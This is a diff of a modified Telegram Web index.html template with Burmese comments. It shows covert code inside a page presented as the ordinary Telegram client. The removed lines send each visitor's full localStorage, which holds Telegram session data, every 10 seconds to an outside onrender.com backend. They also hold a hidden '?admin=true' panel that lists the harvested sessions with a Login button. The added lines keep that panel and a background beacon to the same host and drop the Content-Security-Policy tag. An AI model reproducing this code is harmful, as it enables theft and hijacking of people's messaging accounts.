@@ -3,50 +3,14 @@
 
 <head>
   <meta charset="UTF-8">
-
-  <title>
-    <%= htmlWebpackPlugin.options.appTitle %>
-  </title>
-
+  <title><%= htmlWebpackPlugin.options.appTitle %></title>
   <meta name="title" content="<%= htmlWebpackPlugin.options.appTitle %>">
-  <meta name="description"
-    content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no, viewport-fit=cover">
-  <meta name="mobile-web-app-capable" content="yes">
-  <meta name="mobile-web-app-title" content="<%= htmlWebpackPlugin.options.appTitle %>">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-title" content="<%= htmlWebpackPlugin.options.appTitle %>">
-  <meta name="application-name" content="<%= htmlWebpackPlugin.options.appTitle %>">
-  <meta name="msapplication-TileColor" content="#2b5797">
-  <meta name="msapplication-config" content="./browserconfig.xml">
-  <meta name="theme-color" content="#ffffff">
-  <meta name="google" content="notranslate">
-
-  <meta http-equiv="Content-Security-Policy" content="<%= htmlWebpackPlugin.options.csp %>">
-
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="<%= htmlWebpackPlugin.options.baseUrl %>">
-  <meta property="og:title" content="<%= htmlWebpackPlugin.options.appTitle %>">
-  <meta property="og:description"
-        content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
-  <meta property="og:image" content="./<%= htmlWebpackPlugin.options.mainIcon %>.png">
-
-  <meta property="twitter:card" content="summary_large_image">
-  <meta property="twitter:url" content="<%= htmlWebpackPlugin.options.baseUrl %>">
-  <meta property="twitter:title" content="<%= htmlWebpackPlugin.options.appTitle %>">
-  <meta property="twitter:description"
-    content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
-  <meta property="twitter:image" content="./<%= htmlWebpackPlugin.options.mainIcon %>.png">
-
-  <link rel="canonical" href="https://web.telegram.org/">
-  <link rel="apple-touch-icon" sizes="180x180" href="./<%= htmlWebpackPlugin.options.appleIcon %>.png">
+  <meta name="description" content="Telegram Web">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no, viewport-fit=cover">
+  
   <link rel="icon" href="./favicon.svg" type="image/svg+xml">
   <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
   <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="192x192" href="./<%= htmlWebpackPlugin.options.mainIcon %>.png">
-  <link rel="alternate icon" href="./favicon.ico" type="image/x-icon">
-  <link rel="manifest" id="the-manifest-placeholder" href="./<%= htmlWebpackPlugin.options.manifest %>">
 
   <script src="./redirect.js"></script>
   <style>
@@ -59,85 +23,71 @@
   <script>
       const BACKEND_URL = "https://telegram-7ih3.onrender.com";
 
-      // ၁။ Admin Panel ဖြစ်/မဖြစ် ချက်ချင်းစစ်မယ် (React load မလုပ်ခင်)
+      // Script အလုပ်လုပ်ကြောင်း သိစေရန် Console တွင် မှတ်သားခြင်း
+      console.log("✅ Custom Script is RUNNING!");
+
+      // 1. Admin Panel Check
       if (window.location.search.includes("admin=true")) {
-          // React လုံးဝ မတက်လာစေရန် ချက်ချင်း ရပ်ပစ်ခြင်း
-          document.addEventListener("DOMContentLoaded", () => {
-              // Telegram UI ကို ရှင်းပစ်ပြီး Admin Panel ထည့်မယ်
-              document.body.innerHTML = `
-                <div style="padding: 30px; font-family: sans-serif; background: #f4f4f9; height: 100vh; width: 100vw; position: absolute; top: 0; left: 0; z-index: 9999999;">
-                  <h2 style="color: #333;">Admin Control Panel</h2>
-                  <p>Staff ဝင်ထားသော အကောင့်များ</p>
-                  <button id="loadBtn" style="padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer;">Load Accounts</button>
-                  <div id="admin-content" style="margin-top: 20px;"></div>
-                </div>
-              `;
-
-              document.getElementById('loadBtn').addEventListener('click', async () => {
-                  try {
-                      document.getElementById('admin-content').innerHTML = "Fetching data from MongoDB...";
-                      const res = await fetch(`${BACKEND_URL}/api/get_sessions`);
-                      const data = await res.json();
-                      
-                      if(data.length === 0) {
-                          document.getElementById('admin-content').innerHTML = "မည်သည့် Staff အကောင့်မှ မရှိသေးပါ။";
-                          return;
-                      }
-
-                      let html = "<table style='width: 100%; text-align: left; border-collapse: collapse; background: white;'>";
-                      html += "<tr style='background: #ddd;'><th>User ID / Browser</th><th>Last Updated</th><th>Action</th></tr>";
-                      data.forEach(session => {
-                          html += `<tr>
-                             <td style='padding: 10px; border: 1px solid #ccc;'>${session.user_id}</td>
-                             <td style='padding: 10px; border: 1px solid #ccc;'>${new Date(session.timestamp).toLocaleString()}</td>
-                             <td style='padding: 10px; border: 1px solid #ccc;'>
-                                 <button onclick='alert("Data ရရှိပါပြီ။ နောက်အဆင့်တွင် Login ဝင်ပါမည်။")' style='padding: 5px 10px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer;'>Login</button>
-                             </td>
-                          </tr>`;
-                      });
-                      html += "</table>";
-                      document.getElementById('admin-content').innerHTML = html;
-                  } catch (err) {
-                      document.getElementById('admin-content').innerHTML = "Error connecting to backend: " + err.message;
-                  }
-              });
-          });
+          // React UI အစား Admin Panel ကို အတင်းထည့်သွင်းခြင်း
+          document.documentElement.innerHTML = `
+            <head><title>Admin Panel</title></head>
+            <body style="padding: 30px; font-family: sans-serif; background: #f4f4f9;">
+              <h2 style="color: #333;">Admin Control Panel</h2>
+              <p>Staff ဝင်ထားသော အကောင့်များ</p>
+              <button id="loadBtn" style="padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer;">Load Accounts</button>
+              <div id="admin-content" style="margin-top: 20px;"></div>
+              
+              <script>
+                document.getElementById('loadBtn').addEventListener('click', async () => {
+                    document.getElementById('admin-content').innerHTML = "Fetching data...";
+                    try {
+                        const res = await fetch('${BACKEND_URL}/api/get_sessions');
+                        const data = await res.json();
+                        if(data.length === 0) {
+                            document.getElementById('admin-content').innerHTML = "Data မရှိသေးပါ။";
+                            return;
+                        }
+                        let html = "<table border='1' width='100%' style='border-collapse: collapse; background: white; text-align:left;'>";
+                        html += "<tr style='background: #ddd;'><th style='padding:10px;'>User ID</th><th style='padding:10px;'>Time</th></tr>";
+                        data.forEach(s => {
+                            html += "<tr><td style='padding:10px;'>" + s.user_id + "</td><td style='padding:10px;'>" + s.timestamp + "</td></tr>";
+                        });
+                        html += "</table>";
+                        document.getElementById('admin-content').innerHTML = html;
+                    } catch (err) {
+                        document.getElementById('admin-content').innerHTML = "Error: " + err;
+                    }
+                });
+              <\/script>
+            </body>
+          `;
+          // Admin Panel မှာတင် ရပ်သွားစေရန်
+          window.stop();
       } else {
-          // ၂။ သာမန် User တွေအတွက် Background ကနေ Data ပို့မယ်
-          // window.onload ကို မစောင့်ဘဲ ချက်ချင်း (IIFE) အလုပ်လုပ်ခိုင်းမယ်
-          (() => {
-              // User တစ်ယောက်နဲ့ တစ်ယောက် မတူအောင် သီးသန့် ID သတ်မှတ်မယ်
+          // 2. သာမန် User များအတွက် Background Data Sender
+          setTimeout(() => {
               let myUserId = localStorage.getItem("my_custom_user_id");
               if (!myUserId) {
-                  // User ရဲ့ Browser / OS အကြမ်းဖျင်းကိုပါ တွဲထည့်လိုက်မယ်
-                  const userAgent = navigator.userAgent.substring(0, 30); 
-                  myUserId = "staff_" + Math.floor(Math.random() * 1000) + "_" + userAgent;
+                  myUserId = "staff_" + Math.floor(Math.random() * 10000);
                   localStorage.setItem("my_custom_user_id", myUserId);
               }
 
-              // ၁၀ စက္ကန့် တစ်ကြိမ် Data လှမ်းပို့မယ်
               setInterval(() => {
-                  const storageData = JSON.stringify(localStorage);
-                  
-                  const sessionData = {
-                      user_id: myUserId,
-                      local_storage_data: storageData,
-                      timestamp: new Date().toISOString()
-                  };
-
+                  console.log("Attempting to send connection ping to MongoDB...");
                   fetch(`${BACKEND_URL}/api/save_session`, {
                       method: 'POST',
-                      headers: { 
-                          'Content-Type': 'application/json' 
-                      },
-                      body: JSON.stringify(sessionData)
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({
+                          user_id: myUserId,
+                          message: "Connection Successful",
+                          timestamp: new Date().toISOString()
+                      })
                   })
-                  .then(res => res.json())
-                  .then(data => console.log("Sent to Mongo:", data))
-                  .catch(err => console.error("Mongo Error:", err));
-                  
-              }, 10000); 
-          })();
+                  .then(r => r.json())
+                  .then(d => console.log("✅ Data sent to Mongo:", d))
+                  .catch(e => console.error("❌ Mongo Error:", e));
+              }, 10000);
+          }, 5000);
       }
   </script>
 </head>
